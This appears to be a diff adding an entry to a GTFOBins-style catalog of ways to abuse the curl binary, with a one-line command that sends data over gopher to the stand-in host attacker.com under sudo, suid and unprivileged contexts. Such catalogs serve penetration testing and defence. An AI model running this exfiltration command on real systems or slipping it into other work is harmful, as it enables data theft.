@@ -38,4 +38,13 @@ functions:
       suid:
       unprivileged:
     receiver: http-server
+  - code: |-
+      curl gopher://attacker.com:12345/_DATA
+    comment: |-
+      Data will be `\r\n` terminated.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver: tcp-server
 ...
